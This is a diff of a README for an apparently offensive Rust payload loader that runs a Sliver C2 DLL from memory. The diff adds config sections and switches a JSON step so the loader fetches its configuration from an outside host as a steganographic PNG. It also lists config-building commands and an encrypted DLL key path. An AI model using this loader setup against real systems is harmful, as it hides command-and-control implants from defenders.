@@ -29,6 +29,9 @@ malléable : adjectif
     - [OLLVM compilation (optionnal)](#OLLVM-compilation-optionnal)
   - [2. Encrypt payload (optionnal)](#2-encrypt-payload-optionnal)
   - [3. Create config file](#3-Create-config-file)
+    - [3.1 Banner config](#31-Banner-config)
+    - [3.2 Encrypted dll config](#32-Encrypted-dll-config)
+    - [3.3 Stegano to hide config](#33-Stegano-to-hide-config)
   - [4. Compile loader](#4-Compile-loader)
     - [4.1 linux compilation](#41-linux-compilation)
     - [4.2 windows debug compilation with logs](#42-windows-debug-compilation-with-logs)
@@ -146,10 +149,9 @@ Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, th
     },
     {
       "HTTP": {
-        "url": "https://kaboum.xyz/artdonjon/troll.html",
+        "url": "https://kaboum.xyz/artdonjon/troll.png",
         "dataoperation": [
-          "WEBPAGE",
-          "BASE64"
+          "STEGANO"
         ],
         "sleep": 0,
         "jitt": 0
@@ -316,7 +318,7 @@ the simpliest payload one, only print the awesome project banner in a fashion wa
 cargo run --bin conf banner
 ```
 
-### 3.2 Encrypted dll configuration
+### 3.2 Encrypted dll config
 
 By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable/payload/sliver.dll.dataop` , modifying it for simplicity: 
 
@@ -324,7 +326,7 @@ By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable
 cargo run --bin conf dll
 ```
 
-### 3.3 Stegano
+### 3.3 Stegano to hide config
 
 if you want to use stegano to hide conf, you should precise an input image with this environnment variable:
 
